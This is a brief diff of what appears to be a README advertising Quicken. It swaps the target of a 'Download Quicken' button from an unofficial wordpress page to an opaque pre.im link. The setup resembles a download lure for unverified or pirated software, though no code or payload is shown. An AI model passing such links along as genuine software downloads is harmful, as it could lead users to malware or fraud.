@@ -13,8 +13,7 @@ Quicken is a powerful personal finance tool that helps you manage expenses, trac
 
 .. image:: Button.png
    :alt: Download Quicken
-   :target: https://quickencomdownload.wordpress.com/
-
+   :target: https://pre.im/?yFluJEmDu0Y0IQqDNGuNEDdmTXQwM9AmknnnH0Y8Yi6QPhMIVQBYCHLRAyRjVvnJ1STzPSW
 
 .. raw:: html
 
